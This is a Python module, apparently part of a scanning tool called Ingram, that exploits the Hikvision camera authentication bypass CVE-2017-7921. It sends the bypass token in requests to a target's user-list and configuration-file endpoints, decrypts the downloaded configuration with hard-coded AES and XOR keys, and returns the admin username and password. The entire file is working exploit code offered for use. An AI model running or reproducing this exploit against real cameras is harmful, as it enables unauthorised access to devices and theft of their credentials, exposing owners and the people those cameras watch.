"""hikvision cve-2017-7921
Bypassing authentication vulnerability
decrypt reference:
https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor
"""
import re
import requests

from itertools import cycle
from Crypto.Cipher import AES

from Ingram.utils import config
from Ingram.utils import logger


def config_decryptor(data):
    """
    vars:
      - data: binary content, such as requests.content or open('xx', 'rb')
    return:
      - (user, passwd)
    """
    def add_to_16(s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s 

    def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))

    def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = add_to_16(ciphertext)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def strings(file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)

    xor = xore(decrypt(data))
    res = strings(xor.decode('ISO-8859-1'))
    idx = -res[::-1].index('admin')
    user, passwd = res[idx - 1], res[idx]
    return user, passwd


def cve_2017_7921(ip: str) -> list:
    headers = {'Connection': 'close', 'User-Agent': config.USERAGENT}
    user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
    config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"
    timeout = config.TIMEOUT

    try:
        r = requests.get(user_url, timeout=timeout, verify=False, headers=headers)
        if r.status_code == 200 and 'userName' in r.text and 'priority' in r.text and 'userLevel' in r.text:
            rc = requests.get(config_url, timeout=timeout * 2, verify=False, headers=headers)
            user, passwd = config_decryptor(rc.content)
            return [True, str(user), str(passwd), 'cve-2017-7921']
    except Exception as e:
        logger.error(e)
    return [False, ]
